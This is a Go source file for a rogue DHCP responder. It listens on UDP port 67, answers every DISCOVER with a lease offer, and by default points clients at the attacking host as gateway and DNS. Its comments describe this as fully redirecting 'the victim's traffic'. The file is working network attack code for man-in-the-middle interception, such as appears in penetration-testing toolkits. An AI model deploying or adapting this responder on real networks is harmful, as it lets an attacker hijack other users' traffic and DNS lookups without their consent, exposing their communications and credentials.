package dhcp

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync/atomic"
)

// Responder is the rogue DHCP server. It listens on UDP :67, answers every
// DISCOVER with an OFFER granting an address in the configured range and
// pointing the client at this host as both gateway and DNS resolver.
type Responder struct {
	addr      *net.UDPAddr
	serverIP  net.IP
	gatewayIP net.IP
	dnsIP     net.IP
	mask      net.IP
	poolStart net.IP // first address of the lease pool
	poolSize  uint32 // number of addresses in the pool
	next      uint32 // round-robin cursor into the pool
	conn      *net.UDPConn
	stop      chan struct{}
	done      chan struct{} // closed by serve when it exits

	Offers  atomic.Uint64 // DHCPOFFERs transmitted
	Queries atomic.Uint64 // DHCP packets received
}

// Config configures the rogue responder.
type Config struct {
	ServerIP net.IP // this host's IP (server id + router)
	Gateway  net.IP // offered default gateway (defaults to ServerIP)
	DNS      net.IP // offered DNS (defaults to ServerIP)
	Mask     net.IP // subnet mask (defaults to /24)
	Pool     net.IP // first address of the lease pool (defaults to ServerIP)
	Size     uint32 // number of addresses in the pool (defaults to 250)
}

// NewResponder builds a rogue DHCP responder. Bind() must be called to listen.
func NewResponder(cfg Config) *Responder {
	// Every omitted value falls back to pointing at the rogue server itself so
	// a minimal config still fully redirects the victim's traffic.
	if cfg.Gateway == nil {
		cfg.Gateway = cfg.ServerIP
	}
	if cfg.DNS == nil {
		cfg.DNS = cfg.ServerIP
	}
	if cfg.Mask == nil {
		cfg.Mask = net.IPv4(255, 255, 255, 0)
	}
	if cfg.Pool == nil {
		cfg.Pool = cfg.ServerIP
	}
	if cfg.Size == 0 {
		cfg.Size = 250
	}
	return &Responder{
		// Listening on 0.0.0.0:67 accepts DISCOVERs from any local subnet.
		addr:      &net.UDPAddr{IP: net.IPv4zero, Port: 67},
		serverIP:  cfg.ServerIP.To4(),
		gatewayIP: cfg.Gateway.To4(),
		dnsIP:     cfg.DNS.To4(),
		mask:      cfg.Mask.To4(),
		poolStart: cfg.Pool.To4(),
		poolSize:  cfg.Size,
		stop:      make(chan struct{}),
		done:      make(chan struct{}),
	}
}

// Start binds :67 and begins serving DISCOVERs until Stop.
func (r *Responder) Start() error {
	conn, err := net.ListenUDP("udp4", r.addr)
	if err != nil {
		return fmt.Errorf("bind udp :67: %w", err)
	}
	r.conn = conn
	go r.serve()
	return nil
}

// Stop closes the socket and waits for the serve loop to exit.
func (r *Responder) Stop() {
	// Idempotent shutdown: a second Stop must not panic on double close.
	select {
	case <-r.stop:
		return
	default:
		close(r.stop)
	}
	if r.conn != nil {
		r.conn.Close()
	}
	<-r.done
}

// serve reads datagrams until stopped and answers each DHCPDISCOVER.
func (r *Responder) serve() {
	defer close(r.done)
	buf := make([]byte, 2048)
	for {
		select {
		case <-r.stop:
			return
		default:
		}
		n, addr, err := r.conn.ReadFromUDP(buf)
		if err != nil {
			// A read error is fatal only if we are stopping; otherwise the
			// socket is likely still usable, so keep serving.
			select {
			case <-r.stop:
				return
			default:
			}
			continue
		}
		r.Queries.Add(1)
		h, err := Unmarshal(buf[:n])
		if err != nil || h.Op != opRequest {
			continue // not a well-formed DHCP request from a client
		}
		msgType := getMessageType(h.Options)
		if msgType == TypeDiscover {
			offered := r.nextAddr()
			if offered == nil {
				continue
			}
			raw, err := Offer(h.Xid, h.CHAddr, offered, r.serverIP, r.mask)
			if err != nil {
				continue
			}
			// Reply straight to the source address; the client listens on 68.
			if _, err := r.conn.WriteToUDP(raw, addr); err != nil {
				continue
			}
			r.Offers.Add(1)
		}
	}
}

// nextAddr returns the next address in the pool, cycling.
func (r *Responder) nextAddr() net.IP {
	idx := r.next % r.poolSize
	r.next++
	// Treat the pool start as a 32-bit integer and add the offset, writing the
	// result back out in network byte order.
	base := binary.BigEndian.Uint32(r.poolStart.To4())
	v := base + idx
	out := make(net.IP, 4)
	binary.BigEndian.PutUint32(out, v)
	return out
}

// getMessageType extracts DHCP option 53. It returns 0 for any packet that
// does not carry a valid type option.
func getMessageType(opts []byte) byte {
	for i := 0; i+1 < len(opts); {
		code := opts[i]
		if code == 0 { // padding
			i++
			continue
		}
		if code == 255 {
			return 0 // END of options reached, no type option seen
		}
		if i+1 >= len(opts) {
			return 0
		}
		l := int(opts[i+1])
		if i+2+l > len(opts) {
			return 0 // option extends past the buffer
		}
		if code == 53 && l >= 1 {
			return opts[i+2]
		}
		i += 2 + l
	}
	return 0
}
